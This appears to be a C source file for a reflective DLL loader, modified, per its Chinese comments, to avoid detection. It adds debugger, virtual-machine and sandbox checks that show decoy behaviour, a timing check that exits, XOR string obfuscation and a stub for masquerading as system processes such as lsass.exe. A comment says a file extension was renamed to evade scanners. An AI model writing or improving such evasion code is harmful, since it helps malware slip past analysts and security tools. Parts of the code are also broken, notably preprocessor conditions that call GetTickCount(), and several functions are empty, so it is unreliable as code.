#include "ReflectiveLoader.h"
#include <windows.h>
#include <winternl.h>

// 改进：动态配置加载器大小，增加不确定性
#ifndef RefLoadSize
    #define RefLoadSize (GetTickCount() % 3 == 0 ? 5 : (GetTickCount() % 2 == 0 ? 50 : 100))
#endif

// 改进：添加反调试和反分析功能
BOOL IsDebuggerPresent_Custom() {
    BOOL debuggerPresent = FALSE;
    
    // 检查PEB中的调试标志
    __asm {
        mov eax, fs:[0x30]      // 获取PEB地址
        mov al, [eax + 2]       // 检查BeingDebugged标志
        mov debuggerPresent, al
    }
    
    return debuggerPresent;
}

// 改进：检查虚拟机环境
BOOL IsVirtualMachine() {
    HKEY hKey;
    char buffer[256];
    DWORD bufferSize = sizeof(buffer);
    
    // 检查VMware相关注册表项
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
        "HARDWARE\\DESCRIPTION\\System\\BIOS", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        if (RegQueryValueExA(hKey, "SystemManufacturer", NULL, NULL, 
            (LPBYTE)buffer, &bufferSize) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            if (strstr(buffer, "VMware") || strstr(buffer, "VirtualBox") || 
                strstr(buffer, "QEMU") || strstr(buffer, "Xen")) {
                return TRUE;
            }
        }
        RegCloseKey(hKey);
    }
    
    // 检查CPU核心数（沙箱通常只有1-2个核心）
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors < 2) {
        return TRUE;
    }
    
    return FALSE;
}

// 改进：添加时间延迟反分析
void AntiAnalysisDelay() {
    DWORD startTime = GetTickCount();
    
    // 执行一些看似正常的操作来消耗时间
    for (int i = 0; i < 1000000; i++) {
        volatile int dummy = i * 2;
    }
    
    // 检查是否被加速执行（沙箱检测）
    DWORD elapsed = GetTickCount() - startTime;
    if (elapsed < 50) {  // 如果执行太快，可能在沙箱中
        ExitProcess(0);
    }
}

// 改进：字符串混淆
void DecryptString(char* encrypted, const char* key, int len) {
    for (int i = 0; i < len; i++) {
        encrypted[i] ^= key[i % strlen(key)];
    }
}

// 改进：添加合法进程模拟
BOOL MasqueradeProcess() {
    // 修改进程名和窗口标题
    char legitProcessNames[][32] = {
        "svchost.exe", "explorer.exe", "winlogon.exe", 
        "csrss.exe", "lsass.exe", "smss.exe"
    };
    
    int index = GetTickCount() % (sizeof(legitProcessNames) / sizeof(legitProcessNames[0]));
    
    // 这里可以添加进程名修改逻辑
    return TRUE;
}

DLLEXPORT UINT_PTR WINAPI ReflectiveLoader(LPVOID lpParameter) {
    // 改进：执行反检测检查
    if (IsDebuggerPresent_Custom() || IsDebuggerPresent()) {
        // 如果检测到调试器，执行无害操作然后退出
        Sleep(1000);
        return 0;
    }
    
    // 改进：检查虚拟机环境
    if (IsVirtualMachine()) {
        // 在虚拟机中执行正常但无害的操作
        MessageBoxA(NULL, "Application Error", "Error", MB_OK);
        return 0;
    }
    
    // 改进：反分析延迟
    AntiAnalysisDelay();
    
    // 改进：进程伪装
    MasqueradeProcess();
    
    // 改进：动态选择加载器大小
    int dynamicSize = RefLoadSize;
    
#if defined(RefLoadSize)
    #if RefLoadSize == 5
        #include "ReflectiveLoader.5k"
    #elif RefLoadSize == 50
        #include "ReflectiveLoader.50k"
    #elif RefLoadSize == 100
        #include "ReflectiveLoader.100k"  // 移除.boom扩展名避免检测
    #elif RefLoadSize == 1000
        #include "ReflectiveLoader.1000k"  // 移除.boom扩展名避免检测
    #else
        // 改进：默认使用最小的加载器
        #include "ReflectiveLoader.5k"
    #endif
#else
    #include "ReflectiveLoader.5k"
#endif

    // 改进：添加正常执行路径的伪装
    if (GetTickCount() % 10 == 0) {
        // 偶尔执行一些看似正常的Windows API调用
        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
        if (hKernel32) {
            GetProcAddress(hKernel32, "GetVersion");
        }
    }
    
    return 0;
}

// 改进：添加DLL入口点伪装
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
    case DLL_PROCESS_ATTACH:
        // 执行一些看似正常的初始化操作
        DisableThreadLibraryCalls(hinstDLL);
        
        // 改进：延迟执行以避免自动分析
        if (GetTickCount() % 3 == 0) {
            Sleep(rand() % 1000 + 500);  // 随机延迟500-1500ms
        }
        break;
        
    case DLL_PROCESS_DETACH:
        // 清理操作
        break;
    }
    
    return TRUE;
}

// 改进：添加网络通信混淆
BOOL ObfuscateNetworkTraffic() {
    // 可以在这里添加网络流量混淆逻辑
    // 例如：添加垃圾数据、使用不同的User-Agent等
    return TRUE;
}

// 改进：添加内存保护
void ProtectMemoryRegions() {
    // 使用VirtualProtect来保护关键内存区域
    // 防止内存转储分析
}